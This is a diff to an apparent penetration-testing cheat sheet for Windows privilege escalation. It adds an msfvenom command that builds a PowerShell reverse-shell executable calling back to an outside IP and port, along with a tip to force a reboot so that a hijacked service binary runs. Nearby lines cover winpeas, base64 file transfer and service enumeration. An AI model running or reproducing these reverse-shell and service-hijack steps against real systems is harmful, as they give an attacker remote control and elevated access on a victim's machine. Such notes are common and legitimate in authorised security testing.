@@ -257,6 +257,10 @@ Wrap in `powershell -c "Invoke-Web..."` if needed
 	./winpeas.exe > winpeas-output.txt
 Run the script and save results  
 
+## File hijacking
+	msfvenom -p windows/powershell_reverse_tcp LPORT=9001 LHOST=123.123.123.1 -f exe > binary.exe
+`msfvenom -l payloads` and `msfvenom -l formats` for more types  
+
 ## Windows - file transfer
 	[Convert]::ToBase64String((Get-Content -path "C:\filename" -Encoding byte))
 Convert file into clipboard contents  
@@ -305,6 +309,8 @@ Show all binary paths
 
 	Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName | Where-Object {$_.PathName -notlike "*system32\svchost*"}
 List all services and binary paths, omit svchost  
+
+For most replaced services, they cannot be started due to lack of privileges, so initiate `shutdown /r /t 0`  
 
 ## Windows - open ports
 	netstat -ano
